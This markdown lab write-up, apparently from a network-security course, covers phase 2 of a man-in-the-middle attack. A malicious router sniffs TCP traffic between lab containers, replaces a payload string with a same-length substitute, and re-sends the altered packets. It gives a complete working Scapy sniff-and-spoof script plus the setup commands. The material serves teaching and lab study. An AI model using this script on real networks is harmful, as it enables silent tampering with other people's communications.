# MITM Sniff-and-Spoof — Phase 2

## Goal

With traffic now flowing through the malicious router (achieved in [Phase 1](icmp-redirect-attack.md)), intercept TCP packets from the victim, **modify the payload**, and forward the altered packets to the target host — while keeping the TCP connection intact.

---

## How It Works

The malicious router uses a **sniff-and-spoof** approach:

1. **Disable kernel IP forwarding** — prevents the OS from automatically forwarding packets, forcing them through our script instead.
2. **Sniff victim → target TCP traffic** — Scapy captures packets matching the filter.
3. **Modify payload** — Replace a known pattern with a same-length substitute to preserve TCP sequence numbers.
4. **Re-send the modified packet** — Forward it to the target as if nothing changed.

---

## Attack Steps

1. **Disable IP forwarding** (on malicious router):
   ```bash
   sysctl net.ipv4.ip_forward=0
   ```

2. **Start the netcat server** (on target host `192.168.60.5`):
   ```bash
   nc -lp 9000
   ```

3. **Start the victim's netcat client** (on victim `10.9.0.5`):
   ```bash
   nc 192.168.60.5 9000
   ```

4. **Run the sniff-and-spoof script** (on malicious router):
   ```bash
   sudo python3 /volumes/mitm_sniff_spoof.py
   ```

5. **Type a message on the victim** — the target host receives the modified version.

---

## Script: `mitm_sniff_spoof.py`

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, sniff, send

REPLACE_PATTERN = b"ashiq"    # string to find in payload
REPLACE_WITH    = b"AAAAA"    # same-length replacement (preserves TCP seq numbers)
SNIFF_FILTER    = "tcp and host 10.9.0.5 and host 192.168.60.5"
SNIFF_IFACE     = "eth0"

def spoof_pkt(pkt):
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return
    newpkt = IP(bytes(pkt[IP]))
    del newpkt.chksum
    del newpkt[TCP].payload
    del newpkt[TCP].chksum

    if pkt[TCP].payload:
        data = bytes(pkt[TCP].payload.load)
        if REPLACE_PATTERN in data:
            send(newpkt / data.replace(REPLACE_PATTERN, REPLACE_WITH))
        else:
            send(newpkt / data)
    else:
        send(newpkt)

sniff(iface=SNIFF_IFACE, filter=SNIFF_FILTER, prn=spoof_pkt)
```

Full script: [`../scripts/mitm_sniff_spoof.py`](../scripts/mitm_sniff_spoof.py)

---

## Key Implementation Details

| Detail | Explanation |
|--------|-------------|
| Same-length replacement | Payload modifications must preserve length to avoid breaking TCP sequence numbers |
| One-direction capture | Capturing only victim → host traffic is sufficient; modifying one direction achieves the MITM goal |
| IP filter vs MAC filter | IP-based filter is more reliable than MAC in container environments |
| Reconstruct from raw bytes | `IP(bytes(pkt[IP]))` avoids reference issues when rebuilding the packet |
| Checksum deletion | Scapy recalculates checksums automatically when the field is deleted before sending |

---

## Result

The victim types a message containing the target string (e.g. a name). The **target host receives the modified version** — the replacement string appears instead. The victim sees no indication that anything was changed.

See [Verification](../04-verification/wireshark-analysis.md) for captured evidence and observations.

The overall behaviour of the malicious router in both cases (IP forwarding enabled vs disabled) is illustrated in:

- [Task 2 — malicious router container (IP forwarding on vs off)](../04-verification/task 2/Task 2 malicious router container .png)

Task 2 screenshots are organized under `04-verification/task 2/`:

- **IP forwarding = 0** (MITM active on malicious router)
  - [Launching attack from attacker container](../04-verification/task 2/IP FORWARDING IS 0/lauching attack from attacker container.png)
  - [Task 2 — host side](../04-verification/task 2/IP FORWARDING IS 0/Task 2 host side.png)
  - [Task 2 — victim side](../04-verification/task 2/IP FORWARDING IS 0/Task 2 victim side.png)

- **IP forwarding = 1** (kernel forwarding enabled)
  - [Task 2 — netcat client](../04-verification/task 2/IP FORWARDING IS 1/task 2 netcat client.png)
  - [Task 2 — netcat server (1)](../04-verification/task 2/IP FORWARDING IS 1/Task 2 netcat server(1).png)
  - [Task 2 — netcat server (2)](../04-verification/task 2/IP FORWARDING IS 1/task 2 netcat server(2).png)
